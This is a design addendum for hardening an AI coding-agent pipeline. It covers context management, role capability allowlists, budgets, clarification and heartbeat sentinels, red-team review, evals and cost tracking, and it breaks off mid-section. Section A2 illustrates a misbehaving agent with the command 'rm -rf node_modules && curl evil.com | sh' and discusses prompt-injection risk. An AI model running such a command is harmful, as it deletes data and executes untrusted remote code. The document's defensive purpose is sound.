# Agentic Pipeline Template — Addendum: Top-Tier Hardening

**Date:** 2026-05-04
**Owner:** TerminalX
**Status:** Companion to `2026-05-03-agentic-pipeline-template-design.md`. Ready for plan generation.
**Slug:** `agentic-pipeline-template-addendum`

---

## 0. Reading guide

The base spec gets the **mechanics** right (state machine, sentinels, worktree isolation, audit-only merger). This addendum adds the layer that distinguishes a serviceable internal tool from a top-tier agentic platform: **context engineering, capability scoping, budgets, evals, and institutional memory**. Numbering continues from the base spec to avoid collisions; new sections are A1–A26.

Each addition lists: *what's missing*, *the change*, and *why it matters*. Where it touches existing spec sections, the cross-reference is explicit. Where it adds new IPCs, schema fields, or telemetry events, those are spelled out so the implementation plan can absorb them without re-design.

### 0.1 Production prerequisites — folded into the base spec (2026-05-03)

After review on 2026-05-04, six items were promoted from this addendum into the base spec because they are not "platform polish" but **floor-level prerequisites** for the v1 production claim:

| Section | Reason for promotion |
|---|---|
| A2 capability scoping per role | Defence-in-depth against prompt injection. Without it, "Reviewer is read-only" is a norm, not a fact. |
| A5 clarification sentinel | Third primitive (DONE / FAILED / QUESTION) is required for honest-uncertainty reporting; fundamental, not optional. |
| A10 heartbeats and stuck detection | Silent-hang is the single worst failure mode of overnight automation. Without it, the system is not operationally trustworthy. |
| A12 run fingerprint | Reproducibility is non-negotiable. Without it, "it worked yesterday" is unbisectable. |
| A14 notifications | A pause that nobody knows about is worse than no automation. Human-on-the-loop UX is product surface, not nice-to-have. |
| A24 secrets handling (new — flagged in review) | Failure bundles ship via webhooks. Without secret masking, this is a CVE waiting to happen. |
| A26 skill provenance signing (new — flagged in review) | Bundled-skill supply-chain story is incomplete without it; signing infra already exists for the updater. |

These now live in the base spec under §18+ ("production prerequisites"). The text below preserves the addendum's framing for traceability — when reading, treat A2 / A5 / A10 / A12 / A14 / A24 / A26 as **moved**, with this addendum acting as the design rationale and the base spec as the build target.

The remaining items (A1, A3, A4, A6, A7, A8, A9, A11, A13, A15, A16, A17, A18, A19, A20, A25) stay in this document and ship as **roadmap beyond v1** — pulled into base implementation as user signal warrants.

---

## A1. Context engineering as a first-class concern — *shipped 3b.1 (scratchpad skill) + 3b.2 (enforcement) + 3b.3 (sub-agent skill) + 3b.4 (oneshot extensions) + 3b.6 (compaction)*

**Missing.** The base spec assumes each agent process has unbounded context. Builder runs of 40+ tasks across 60+ files will saturate Claude's context window before completion; the spec has no compaction, sub-agent, or scratchpad strategy.

**Change.** Add three context-management primitives, all owned by the role prompts and validated by the controller:

1. **Builder scratchpad.** Builder writes `<worktree>/.tx-builder-notes.md` continuously — a structured running log of: open task, decisions made, next step, blockers. Format pinned by skill (§A1.1). This file is `.gitignore`d and **deleted on `done`**. On any context-pressure event (stage retry, sub-agent return, post-CI), Builder is instructed to re-read this file before continuing. This is the Anthropic "external memory" pattern in its simplest form.
2. **Sub-agent delegation for self-contained tasks.** A new skill `tx-pipeline-subagent` instructs Builder that, for any `PlanTask` whose `acceptance` is fully verifiable (e.g., "this function returns X for input Y"), Builder may invoke a one-shot sub-agent via `agent_run_oneshot` with: a focused brief, the relevant files only (resolved via `git ls-files | grep`), and a return contract `{ filesEdited: string[], commitsCreated: string[], summary: string }`. Sub-agents inherit the worktree CWD but **not** Builder's full context. This caps per-task context cost.
3. **Compaction checkpoints.** When Builder's output stream exceeds a configurable threshold (default 200 KB) since last sentinel, the controller injects a compaction prompt into the next user turn: *"Summarize progress so far in ≤500 tokens; identify next concrete action; resume."* The summary is appended to `.tx-builder-notes.md`. The pre-summary transcript stays in telemetry but is dropped from active context.

**Why it matters.** Long Builder runs are where this system will silently degrade — agents start hallucinating commits, re-doing work, or losing the plan. Without explicit context plumbing, the failure mode is "looked fine in demos, falls apart on the 50-task feature."

### A1.1 New skill: `tx-pipeline-subagent`

**Audience:** Builder when delegating.
**Behavioral contract:**

1. **Self-containment test.** Before delegating, Builder must articulate the sub-task's acceptance criterion in a single sentence verifiable against committed code. If you can't, don't delegate.
2. **Bounded brief.** The sub-agent receives: the parent `PlanTask`, the *exact* file globs to read, the acceptance criterion, the worktree branch, and the run id (for the provenance trailer). Nothing else. Not the full plan, not the build history.
3. **Forbidden delegations.** Sub-agents do not run CI, do not push, do not modify files outside the brief's globs, and do not spawn further sub-agents (one-level delegation only). Recursion here is how token bills explode.
4. **Sentinel contract.** Sub-agents emit `<<<TX_SUBAGENT_DONE>>>{...}` with the schema in §A8. Failure → `<<<TX_SUBAGENT_FAILED>>>` and Builder absorbs the task itself.

---

## A2. Capability scoping per role (allowlists, not just blocklists)

**Missing.** The `git-guardrails` hook blocks specific destructive git verbs. It does not constrain: file write paths, network egress, arbitrary subprocess spawning (`curl`, `npm publish`, `aws ...`), nor MCP tool selection. A misbehaving Builder can still `rm -rf node_modules && curl evil.com | sh` — the guardrail catches `git push` and nothing else.

**Change.** Per-role capability manifest, generated at run-start and installed into the worktree's `.claude/settings.json` alongside the guardrails hook. Schema:

```ts
export interface RoleCapabilities {
  fileWrites: { allow: string[]; deny: string[] };       // glob patterns
  shell: { allow: RegExp[]; deny: RegExp[] };            // PreToolUse Bash matcher
  network: 'none' | 'package-managers' | 'unrestricted'; // PreToolUse fetch matcher
  mcpTools: string[];                                    // explicit allowlist
  maxFileSize: number;                                   // bytes; deny writes above
}
```

Defaults per role:

| Role | fileWrites | shell | network | mcpTools |
|---|---|---|---|---|
| Planner | `docs/**`, `**/*.md` only | read-only verbs (`git status`, `ls`, `cat`, `rg`) | `none` | none |
| Builder | project tree minus `.git/`, `node_modules/`, `.tx-worktrees/`, `.terminalx/` | full minus destructive git (still hooked) | `package-managers` (npm/pnpm/cargo/pip registries only) | none by default; opt-in per template |
| Reviewer | **read-only** — all writes denied | read-only verbs only | `none` | none |
| Sub-agent | inherits Builder's filewrites scoped to brief globs | inherits Builder | inherits Builder | none |

The `network: 'package-managers'` enforcement is achieved via a PreToolUse hook that blocks any fetch outside an allowlisted domain set (the `network_configuration` pattern already used elsewhere). For projects without network needs, Builder defaults to `none` — flip to `package-managers` only if the pre-flight detects a package install in the project's setup.

**Why it matters.** A reviewer that can write files is one prompt-injection away from rewriting its own verdict and the code. Defence-in-depth means the Reviewer process is *physically incapable* of writing, not "instructed not to." Same for Planner and the docs/specs/ scope.

---

## A3. Budgets: tokens, dollars, wallclock

**Missing.** A runaway Builder loop can burn $40 of Sonnet 4.6 calls before anyone notices. The spec has retry budgets for *outcomes* (reviewer rejects, CI fails) but no budget on *consumption*.

**Change.** Add to `PipelineConfig`:

```ts
export interface PipelineBudget {
  maxTokensPerRun: number;        // default 2,000,000
  maxUsdPerRun: number;           // resolved by complexity, see below
  maxWallclockMsPerStage: Record<PipelineRole, number>;
  // default: planner 30min, builder 60min, reviewer 10min, subagent 10min
  onExceeded: 'abort' | 'pause_for_user';  // default 'pause_for_user'
}
```

**Defaults scale with `PlanArtifact.complexity` (see §A4):**

| complexity | `maxUsdPerRun` default | Rationale |
|---|---|---|
| `trivial` | $5 | Single small change; if this run costs more than $5 something is wrong. |
| `standard` | $25 | Most everyday work. |
| `complex` | $100 | Triggers sub-agents (§A1), red-team (§A6), chunked review (§A9), tiebreaker (§A19) — all of which multiply token usage. A flat $25 budget would foot-gun the very runs the platform features exist for. |

Per-project override available in `pipeline.budget` template config. The complexity is known at `approvePlan` time, so the budget is finalised after Planner emits — earlier states use the `standard` default.

The controller subscribes to per-tool token-usage events emitted by `agent_spawn` (already plumbed through `claude --output-format=stream-json` for live agents; one-shots return totals on exit). Each ingest updates `run.consumption: { tokens, usd, wallclockMsByStage }`. On threshold breach: state → `budget_paused` (new state); user sees a modal with current consumption and "Continue with $X more / Abort." The pipeline-controller tile shows live consumption with a colour band (green/amber/red).

`run.consumption` ships in the failure bundle and the telemetry JSONL.

**Why it matters.** Operational hygiene. The first 3 a.m. run that costs $400 will end internal trust in the system. Budgets are how you prevent that without sacrificing autonomy.

---

## A4. Plan complexity gate (right-size the automation)

**Missing.** The Anthropic Trio is overkill for a 3-line CSS fix. Running a 4-stage ceremony with worktree, dual reviewer, merger UI, etc. for trivial changes will train users to never use the pipeline.

**Change.** The Planner emits a `complexity` field on the `PlanArtifact`:

```ts
complexity: 'trivial' | 'standard' | 'complex';
```

Definitions, encoded in the planner skill:

- `trivial` — ≤2 files, ≤30 lines changed, no new dependencies, no public API change.
- `standard` — anything not trivial or complex. Default.
- `complex` — touches ≥10 files, modifies a public API, adds a dependency, or contains the strings "migration", "schema", "security", "auth" in the user request.

Routing on `approvePlan`:

| complexity | Pipeline path |
|---|---|
| `trivial` | **Single fast Reviewer with reduced scope** (diff + plan only — no full ADR scan, no INVARIANTS.md cross-check, no constitutional carve-out pass). Lower review token budget. Merger gate uses a single-line confirm with diff stat instead of full modal. **Reviewer is never skipped** — even a 30-line CSS change can ship a regression. |
| `standard` | Default path (planner → builder → reviewer → merger). Full reviewer scope. |
| `complex` | **Forces dual-reviewer on**, **forces merger to PR mode** (not local merge), **lowers retry budgets to 2** (faster escalation), **enables the adversarial pass** (§A6), **enables tiebreaker** (§A19). |

The user can override the routing on the plan-approval modal. Routing decisions are logged to telemetry as `{event: 'complexity_routing', value: ...}`.

**Why it matters.** Calibrated automation. The system's perceived intelligence is its ability to *not* run the heavy machine for small jobs.

---

## A5. Clarification sentinel — third primitive beyond DONE/FAILED

**Missing.** Today an agent has two outcomes: complete the work (DONE) or give up (FAILED). The middle case — "I can't proceed without a decision the human owns" — is missing. This pushes agents toward two pathologies: (a) faking DONE with a wrong assumption, (b) FAILED-ing too eagerly when a one-line clarification would unblock them.

**Change.** Third sentinel:

```
<<<TX_STAGE_QUESTION>>>{"question": "...", "context": "...", "options"?: ["...", "..."], "blocking": true}
```

Schema:

```ts
export interface QuestionArtifact {
  stage: PipelineRole;
  question: string;       // ≤200 chars, single concrete question
  context: string;        // ≤1000 chars, what the agent has tried/considered
  options?: string[];     // optional multiple-choice; user can also free-form
  blocking: true;         // currently always true; reserved for non-blocking questions later
}
```

State machine adds `awaiting_clarification` (parallel to `awaiting_plan_approval` / `awaiting_merge_approval`). On entry: agent process is *paused* (suspended PTY for live, no-op for one-shot since it already exited); user gets a notification (§A14); UI shows the question with a free-text answer box and the agent's options. On submit: the answer is injected as the next user turn for the live agent, or the one-shot is re-spawned with the answer added to its input. Stage resumes.

Skill enforcement: the `tx-pipeline-stage-handoff` skill is amended with **rule 14**:

> *"If you find yourself making an assumption you cannot verify, and the assumption materially affects the outcome, emit `<<<TX_STAGE_QUESTION>>>` instead of guessing. Faking certainty when uncertain is a worse outcome than asking — see rule 2 (refusal protocol) which this extends. Limit: 3 questions per run. Hitting the limit collapses to refusal."*

**Why it matters.** This is the difference between "agent that pretends to know" and "agent that knows what it doesn't know." Calibrated humility is a load-bearing property of trustworthy autonomy.

---

## A6. Adversarial / red-team pass (optional, on for `complex`)

**Missing.** The reviewer is cooperative-adversarial — it tries to find bugs in good faith. It does not specifically *try to break* the diff (input fuzzing, edge-case generation, "what if a malicious user does X").

**Change.** New optional role: `red-team`. A headless one-shot, runs in parallel with Reviewer, spawned only when:

- `complexity === 'complex'`, OR
- The diff touches paths matching `**/auth/**`, `**/security/**`, `**/payment/**`, `**/admin/**`, `**/api/public/**` (configurable per project).

Skill bound: new `tx-pipeline-red-team` (drafted in phase 3). Behavioral contract:

1. **Find ways this fails, not ways it works.** Generate as many concrete adversarial inputs / edge cases as you can articulate with high confidence. Each must cite `file:line` and predict the failure. **Quality over quota** — if you can think of zero with high confidence, output `findings: []` with `summary: 'No adversarial vectors identified.'` Padding the count with weak attacks is a worse outcome than an honest empty set.
2. **No speculation.** If you cannot construct a concrete failing input, do not flag. "It might be possible to..." is not a finding.
3. **Verifiable predictions.** Where possible, the prediction takes the form of a test that *should* fail against the current code. The output schema includes `proposedTest?: string`.
4. **Constitutional carve-outs (always blocker):** same list as §10.2 rule 11.

Output:

```ts
export interface RedTeamFinding {
  stage: 'red-team';
  findings: Array<{
    file: string;
    line: number;
    attack: string;            // ≤300 chars, the adversarial input/scenario
    predictedFailure: string;  // ≤300 chars, what breaks
    proposedTest?: string;     // optional code snippet
    severity: 'blocker' | 'concern' | 'nit';
  }>;
}
```

Findings are merged into the Reviewer's verdict at reconciliation: any `severity: 'blocker'` from red-team forces `verdict: 'reject'` regardless of reviewer outcomes (asymmetric — adversarial finds always escalate). `concern`-level findings attach to the verdict for Builder to address.

**Why it matters.** Cooperative reviewers miss adversarial bugs by design; they're scanning for "did this go wrong by accident," not "could a bad actor make this go wrong." Splitting these mindsets between roles is more reliable than asking one role to be both.

---

## A7. Confidence scores and uncertainty-driven escalation

**Missing.** Reviewer outputs binary `approve` / `reject`. A reviewer that's 51% confident on approve looks identical to one that's 99% confident.

**Change.** Add to `ReviewVerdict`:

```ts
confidence: 'verified' | 'likely' | 'uncertain';
uncertaintyDrivers?: string[];          // ≤3 items, required when confidence !== 'verified'
```

The three buckets are designed to match what models can actually self-report. Numerical confidence (`0..1`) was considered and rejected: LLMs cannot reliably distinguish 0.85 from 0.92, but they can reliably distinguish "I checked thoroughly" from "I'm guessing." False precision is worse than honest categorical reporting.

Skill amendment to `tx-pipeline-reviewer`, **rule 14**:

> *"Self-report confidence honestly into one of three buckets:*
>
> - *`verified` — 'I have actively walked through the diff and validated each criterion of this skill against it; nothing is left unchecked.'*
> - *`likely` — 'I believe this is correct but at least one assumption was made without verification, OR a portion of the diff exceeded my effective attention.'*
> - *`uncertain` — 'I am not in a position to issue a verdict.' In this case use `verdict: 'reject'` with concern 'Reviewer needs clarification' per rule 12, never approve.'"*

Controller behavior:

- `verdict: 'approve' && confidence === 'likely'` in single-reviewer mode → **automatic promotion to dual-reviewer** for this round. Spawn the second reviewer; reconcile.
- `verdict: 'approve' && confidence === 'likely'` in dual-reviewer mode and the *other* reviewer is also `likely` → surface to user as `awaiting_clarification` with the merged uncertainty drivers.
- `confidence === 'uncertain'` should never co-occur with `verdict: 'approve'` (skill rule prevents it); if controller observes this combo, it treats the verdict as `reject` and logs a skill-violation event.
- Confidence is logged in telemetry; the rolling distribution per project (`{verified: N, likely: M, uncertain: K}`) is a pipeline-health metric.

**Why it matters.** Confidence is the lever that turns "we always run dual reviewer to be safe" (expensive, slow) into "we run single by default and escalate when uncertain" (efficient, calibrated).

---

## A8. Schema additions (consolidated)

Extends §8 with the artifacts introduced above. Same conventions: TypeScript-typed, JSON-serializable, used as sentinel payloads, controller bus entries, and wire payloads.

```ts
// A8.1 — extends PlanArtifact
export interface PlanArtifact {
  // ... existing fields ...
  complexity: 'trivial' | 'standard' | 'complex';
  estimatedTokens?: number;        // planner's rough estimate; informs budget warnings
  invariantsConsulted: string[];   // paths under <project>/INVARIANTS.md/* the planner read; see §A11
}

// A8.2 — extends BuildArtifact
export interface BuildArtifact {
  // ... existing fields ...
  subagentInvocations: Array<{
    taskId: string;
    summary: string;
    tokensUsed: number;
    durationMs: number;
  }>;
  scratchpadFinalSize: number;     // bytes; sanity check on context ballooning
}

// A8.3 — extends ReviewVerdict
export interface ReviewVerdict {
  // ... existing fields ...
  confidence: 'verified' | 'likely' | 'uncertain';
  uncertaintyDrivers?: string[];       // required when confidence !== 'verified'
  diffChunksReviewed?: number;         // for chunked reviews; see §A9
}

// A8.4 — new
export interface QuestionArtifact { /* §A5 */ }
export interface RedTeamFinding { /* §A6 */ }

export interface SubagentArtifact {
  stage: 'subagent';
  parentRunId: string;
  parentTaskId: string;
  filesEdited: string[];
  commitsCreated: string[];           // SHAs from git log, not invented
  summary: string;
  tokensUsed: number;
}

// A8.5 — extends PipelineRun
export interface PipelineRun {
  // ... existing fields ...
  consumption: {
    tokens: number;
    usd: number;
    wallclockMsByStage: Record<PipelineRole, number>;
  };
  fingerprint: RunFingerprint;       // §A12
  questions: QuestionArtifact[];     // §A5
  redTeamFindings: RedTeamFinding[]; // §A6
  failureClass?: FailureClass;       // §A15
}
```

---

## A9. Diff-aware reviewer chunking

**Missing.** A 4000-line diff exceeds even Opus's effective review attention. The spec assumes one Reviewer pass over the full diff.

**Change.** Controller-side chunker (no agent involvement until chunks are dispatched):

1. After Builder emits `BuildArtifact`, controller runs `git diff --stat <main>..HEAD`.
2. If total diff lines > 1500 OR files changed > 25, enter **chunked review mode**:
   - Group files by directory (deepest common ancestor, fanned to ≤8 chunks).
   - Each chunk gets its own Reviewer one-shot with the **full plan** + **chunk diff only** + **list of other chunks at file-only granularity** (so Reviewer knows what it isn't seeing).
   - Verdicts merged: any chunk's `reject` → overall `reject`. Comments concatenated. Confidence = mean across chunks. `diffChunksReviewed` = number of chunks.
3. Below threshold: single-pass review as before.

Chunking is recorded in the verdict and telemetry: `{event: 'review_chunked', chunks: 5, totalLines: 3200}`.

**Why it matters.** Quietly silent failure mode: Reviewer "approves" a 5000-line diff because it skimmed it. Chunking forces actual coverage and produces a verifiable per-chunk audit trail.

---

## A10. Heartbeats and stuck detection

**Missing.** Builder running for 40 minutes with no output. Is it thinking? Stuck in a tool-use loop? Crashed without exiting? No way to tell.

**Change.** Two mechanisms:

1. **Heartbeat sentinel.** Skill rule (added to `tx-pipeline-stage-handoff` rule 15): *"Every ~3 minutes of activity, emit `<<<TX_HEARTBEAT>>>{\"progress\": \"...\", \"taskId\": \"...\"}` on a single line. Progress field is ≤100 chars describing the most recent completed action."* Controller updates `lastHeartbeatAt` on the run; pipeline-controller tile shows seconds since last heartbeat.
2. **Stuck detection.** If `now() - lastHeartbeatAt > 5min` AND there has been no stdout AND no tool call started in that window → controller dispatches a probe: a single user turn `Are you stuck? If yes, emit failure or question sentinel. If no, emit heartbeat.` After 8 minutes total silence → controller force-kills the agent, transitions to `failed` with `failureReason: 'stage_unresponsive'`, captures last 2KB of stdout in the failure bundle.

**Why it matters.** "Silently hung agent" is the failure mode that destroys overnight automation. Heartbeats let you distinguish working-but-quiet from dead.

---

## A11. Project-level constitution: `INVARIANTS.md` — *shipped 3b.7 (INVARIANTS.md grounding)*

**Missing.** Reviewer's "constitutional carve-outs" are TerminalX-defined globals. Each project has its own immutable invariants ("All money values are stored as integer cents," "No `Date.now()` outside `lib/clock/`," "No SQL string concatenation"). Currently, encoding these requires editing the reviewer skill, which is global.

**Change.** Convention: project root `INVARIANTS.md` (or `docs/INVARIANTS.md`). When present, the controller reads it at run-start and injects its content into:

- Planner role context (so plans don't propose violating invariants).
- Reviewer role context (so reviews flag violations as `blocker` per §10.2 rule 11).
- Red-team role context (so adversarial inputs probe invariant boundaries).

Format is freeform markdown but a recommended skeleton ships in TerminalX docs:

```markdown
# Project Invariants

Each invariant is a single declarative statement that, if violated, MUST block merge.
Invariants are versioned with the codebase. Edit only via PR.

## Data
- All monetary values stored as integer cents. No floats for money. Ever.
- All timestamps are UTC milliseconds since epoch.

## Security
- No `eval`, no `Function()`, no `dangerouslySetInnerHTML` outside `src/sandbox/`.
- All API responses include an `X-Request-Id` header.

## Architecture
- No direct DB access from `controllers/`. All queries go through `repositories/`.
```

The `PlanArtifact.invariantsConsulted` field (§A8.1) tracks which invariants the Planner explicitly considered — empty array when no `INVARIANTS.md` present.

**Why it matters.** Skills encode TerminalX's universal pipeline ethics. INVARIANTS.md encodes the *project's* ethics. Both must be honored. Without this, projects fork the pipeline skills to encode local rules — guaranteed drift, lost upgrades.

---

## A12. Run fingerprint for true replayability

**Missing.** Telemetry is good for forensics but not for *replay*. To re-run a failed run identically, you need: same skills, same role prompts, same template, same inputs. Currently only `terminalx-version`, `claude-version`, `codex-version` are captured.

**Change.** At run-start, controller computes and stores a `RunFingerprint`:

```ts
export interface RunFingerprint {
  templateId: string;
  templateHash: string;                            // sha256 of canonicalized template JSON
  skillHashes: Record<string, string>;             // skill name → sha256 of SKILL.md
  rolePromptHashes: Record<PipelineRole, string>;  // sha256 of resolved role prompts
  invariantsHash?: string;                         // sha256 of INVARIANTS.md if present
  models: Record<PipelineRole, string>;            // exact model strings used
  capabilityManifests: Record<PipelineRole, string>; // sha256 of role capabilities (§A2)
  terminalxVersion: string;
  claudeVersion: string;
  codexVersion?: string;
  runStartCommit: string;                          // git rev-parse main at run start
}
```

Persisted in the run record and the failure bundle. Two values:

1. **Replay.** A "re-run with same fingerprint" command replays from telemetry; skill or prompt drift makes the replay fail loudly with a hash mismatch.
2. **Skill drift detection.** When a run uses a skill version the team has *seen perform poorly*, a startup check (against a future internal "known issues" list) can warn pre-flight.

**Why it matters.** Reproducibility is non-negotiable for trust. "It worked on Monday and broke Tuesday" with no fingerprint means you cannot bisect — was it the skill edit, the prompt tweak, the model change? With it: one diff against the prior run's fingerprint.

---

## A13. Cross-run learning: `.terminalx/lessons-learned/`

**Missing.** Every run starts from zero. The 17th time a project's CI flakes on the same Postgres race condition, the pipeline does not know. The Anthropic pattern — skills as evolving institutional knowledge — is absent at the project level.

**Change.** On every `failed` or `escalated` terminal state, the controller produces a *post-mortem entry*: a one-shot Claude call with the failure bundle as input and a fixed prompt ("Summarize the root cause in ≤120 chars and propose a one-line guard for future runs.") The result writes to `<project>/.terminalx/lessons-learned/<run-id>.md`:

```markdown
---
status: unreviewed   # → 'approved' | 'rejected' | 'archived' after curation
---

# Lesson <run-id> — <date>

**Failure class:** ci_flake
**Root cause:** Postgres connection pool exhaustion when test suite runs in parallel mode.
**Guard:** When CI command involves `pytest` and project uses `psycopg`, run with `-p no:xdist` first try.
**Fingerprint:** <RunFingerprint sha>
```

**Curation gate (this is load-bearing — auto-injecting LLM-generated guards is how you encode mistakes as canon).** Lessons are *generated* automatically but only *applied* after a human reviews and changes the front-matter `status` to `approved`:

- Only `status: approved` lessons are injected into the Planner's role context on future runs.
- The pipeline-controller tile shows an `Unreviewed lessons (N)` badge when N > 0 in the active project; clicking opens a curation panel with side-by-side "this run's failure" vs "proposed guard" + Approve / Reject / Edit-and-approve buttons.
- Rejected lessons are kept on disk (their existence is itself useful provenance) but not injected.
- Approved lessons up to the 20 most recent are injected as: *"Prior failures in this project produced these guards: ..."*

Lessons are versioned with the codebase (committed). Approved lessons older than 6 months auto-archive (`status: archived`); the user can manually re-approve to extend.

**Why it matters.** The pipeline gets *better* the more you use it on a project. This is the difference between a tool you adopt and a tool that becomes part of the team.

---

## A14. Notifications and human-on-the-loop UX

**Missing.** "Minimal human intervention" still requires humans at gates (`awaiting_plan_approval`, `awaiting_merge_approval`, `awaiting_clarification`, `budget_paused`). The spec doesn't address how the human knows to come back.

**Change.** On entry to any `awaiting_*` or `budget_paused` state, the controller emits a notification through three channels (configurable per user):

1. **OS notification** — Tauri's `notification` plugin. Default on. Title = pipeline name, body = state + run id.
2. **Webhook (optional).** User configures a URL in TerminalX settings. POST body = `{ runId, state, project, branch, summary, terminalxDeepLink }`. Suitable for Slack incoming webhooks, Zapier, etc.
3. **In-app toast + dock badge.** Persists until acknowledged.

Re-notification cadence: 15min, 1hr, 4hr, then daily — until acted on. Aborted/done runs clear all pending notifications.

**Why it matters.** A pipeline that pauses at 2 a.m. and waits silently until you check at 9 a.m. is worse than no automation. The signal-to-the-human is part of the product.

---

## A15. Failure taxonomy

**Missing.** `failed` is one bucket. In practice, failures cluster: env failures, planner divergence, builder loops, reviewer stuck, external dep failures. Without a taxonomy, "the pipeline failed" is unanalysable.

**Change.** When transitioning to `failed`, the controller classifies:

```ts
export type FailureClass =
  | 'preflight_env'           // git, CLI, gh, network, etc.
  | 'planner_refused'         // planner emitted FAILED sentinel
  | 'builder_loop'            // ciFail counter exceeded
  | 'reviewer_irreconcilable' // reviewerReject counter exceeded after escalation
  | 'reviewer_disagreement_unresolved' // user picked nothing in disagree state
  | 'budget_exceeded'         // §A3
  | 'stage_unresponsive'      // §A10
  | 'subagent_failed'         // §A1
  | 'external_dep'            // pinpointed in CI output (npm registry down, etc.)
  | 'unknown';
```

Classification logic lives in a pure function over the run's artifacts, used by the controller and surfaced in the failure bundle. Telemetry includes `failureClass` on the terminal `state_change` event.

A simple dashboard tile (phase 3) shows failure-class distribution over the last N runs in this project.

**Why it matters.** Failures you cannot count, you cannot fix. The taxonomy turns "the pipeline is unreliable" (impossible to act on) into "47% of failures last month were `external_dep`" (specific, fixable).

---

## A16. Eval harness for the pipeline itself

**Missing.** How do you know a skill edit improved the pipeline? Vibes. The base spec's behavioural fixtures (§14) check that skills emit valid sentinels — they don't check that the system *succeeds at realistic tasks*.

**Change.** Add `evals/` to the TerminalX repo:

```
evals/
├── fixtures/
│   ├── 01-add-readme-section/
│   │   ├── repo.tar.gz          # frozen project snapshot
│   │   ├── request.txt          # the user request
│   │   ├── expected.json        # required outcomes
│   │   └── README.md
│   ├── 02-fix-failing-test/
│   ├── 03-add-typed-api-route/
│   ├── 04-refactor-rename-symbol/
│   ├── 05-handle-null-in-parser/
│   └── ... (target: 20 fixtures across complexity tiers)
└── run-evals.ts
```

Each fixture's `expected.json`:

```json
{
  "complexity": "standard",
  "mustPass": {
    "headBranchExists": true,
    "ciFinalGreen": true,
    "filesChangedSubset": ["README.md"],
    "noProvenanceTrailerMissing": true,
    "tokensUnder": 500000,
    "wallclockUnder": 600000
  },
  "shouldPass": {
    "noQuestionsAsked": true,
    "reviewerConfidenceAtLeast": 0.85,
    "noEscalation": true
  },
  "mustFailIf": ["modifies_node_modules", "writes_outside_repo"]
}
```

The runner invokes the controller against each fixture, captures telemetry, and produces:

- Pass rate (mustPass), quality rate (shouldPass).
- Aggregate token cost / wallclock.
- Per-stage success rate.
- Comparison against the previous baseline (regression detection).

Run evals: locally before merging skill/prompt changes; in TerminalX's own GitHub Actions on every PR that touches `src-tauri/resources/skills/` or pipeline source.

**Why it matters.** Skills and prompts will drift. Without an eval harness, the only failure detection is users complaining. With it, a regression in plan quality on the "rename symbol" fixture lights up before merge.

---

## A17. Stage-level checkpointing

**Missing.** Resume granularity is per-state. Builder mid-task 47 of 60 crashes → the entire `building` stage starts over.

**Change.** Builder's scratchpad (§A1) doubles as the checkpoint. Schema additions:

```ts
// in BuildArtifact and persisted incrementally as buildProgress
export interface BuildProgress {
  completedTaskIds: string[];          // T1, T2, ...
  inFlightTaskId?: string;
  completedCommits: string[];          // SHAs
  scratchpadPath: string;
}
```

Builder emits `<<<TX_BUILD_PROGRESS>>>{...}` after each completed task (skill rule 16). Controller persists. On resume, controller spawns Builder with: full plan + completedTaskIds + scratchpad content + "Resume from task <inFlightTaskId or first incomplete>." Builder verifies each completed task before skipping it.

**Two-factor resume verification:** a task is treated as "actually complete" only if BOTH:

1. The task's commit SHA exists in `git log` of the worktree branch, AND
2. The CI run for that commit was `status: 'pass'` per the telemetry JSONL.

If commit exists but CI was never green for that commit (e.g., Builder committed a half-feature whose tests passed locally but CI later flagged), the task is **not** treated as complete — Builder re-attempts it. This closes the silent-resume failure mode where committed-but-broken work gets skipped.

Idempotency: if Builder emits a commit for a task already in `completedCommits` AND that commit was CI-green, the redundancy is logged but not failed — the duplicate sentinel is ignored.

**Why it matters.** A 1-hour Builder run that crashes at minute 55 should resume at minute 55, not 0. Otherwise, system reliability is bounded by the longest stage's MTBF.

---

## A18. Concurrent runs

**Missing.** `pipelineStore.activeRunId` is singular. Multiple worktrees support parallel work in principle, but the controller assumes one active run.

**Change.** `activeRunId` → `activeRunIds: string[]`. The pipeline-controller tile is per-run (not singleton). UI: a "Pipelines" sidebar lists all live runs with state badges; clicking focuses the relevant controller tile and worktree.

Constraints:

- Hard cap configurable, default 3 concurrent runs (resource hygiene).
- All concurrent runs must be on **different branches** (the worktree pattern enforces this).
- Notifications include the run id / branch so the user can disambiguate.

**Why it matters.** Real engineering work has parallel feature branches. Forcing serialization defeats the cost model — you have idle compute and idle attention; use both.

---

## A19. Tiebreaker for dual-reviewer disagreement

**Missing.** §7.3 dual-reviewer disagreement always escalates to user. This breaks the "minimal human intervention" promise on the very signal that should be automatable.

**Change.** When `verdict_opus !== verdict_codex`, before surfacing to user:

1. **Tiebreaker pass.** Spawn a third one-shot reviewer: **Sonnet 4.6 with an explicitly different prompt** that asks it to evaluate reasoning, not re-issue a verdict. Family stays the same (Claude); role differs. (We considered using a third vendor — e.g. GPT-5 — but the pipeline only supports Claude + Codex per the platform-CLI commitments; introducing a third vendor would create install-dependency surface that isn't justified for this feature.) Inputs: the diff + both verdicts (de-anonymised by reviewer name) + a tiebreaker prompt:

   > *"Two reviewers disagree on this diff. You are not to issue a third verdict. Your task is to identify which reviewer's reasoning more accurately matches the diff, citing specific points. Output: `{ agreesWith: 'opus' | 'codex' | 'neither', reasoning: string }`. If their points are equally well-grounded but reach different conclusions, output `'neither'` and explain which questions the human needs to resolve."*

2. **Reconcile.** If `agreesWith` matches one reviewer, controller adopts that verdict, marks `tiebrokenBy: 'sonnet-4-6'`, records both original verdicts and the tiebreaker reasoning in artifacts. Counts as 1 toward `reviewerReject` budget (not 0.5 — the tiebreaker has spoken).
3. **`agreesWith: 'neither'`** → escalate to user as before, with the tiebreaker's framing of "what the human needs to resolve" attached.

Tiebreaker is opt-in (config flag, default on for `complex` complexity).

**Why it matters.** The "user picks" path in dual-reviewer is the most expensive operation in the system — it interrupts the human. A tiebreaker that resolves 70% of disagreements automatically eliminates 70% of those interrupts.

---

## A20. Cost attribution and pipeline economics

**Missing.** When the engineering manager asks "what does each pipeline run cost on average," there's no answer.

**Change.** Telemetry includes per-stage token + dollar consumption (§A3). Aggregate views in the controller:

- Per-run total: surfaced in the controller tile after `done`.
- Per-project rolling: the "Pipelines" sidebar (§A18) shows last 7-day average cost per run.
- Per-stage breakdown: shown in the failure bundle and the run history tile (phase 3).

Costing source: a static `pricing.json` shipped with TerminalX, updated on app updates. Per-token rates for each supported model. Calculation:

```ts
costUsd = (inputTokens / 1_000_000) * priceInputPerMTok
        + (outputTokens / 1_000_000) * priceOutputPerMTok
```

Cached and prompt-tokens billed separately when the API surfaces them.

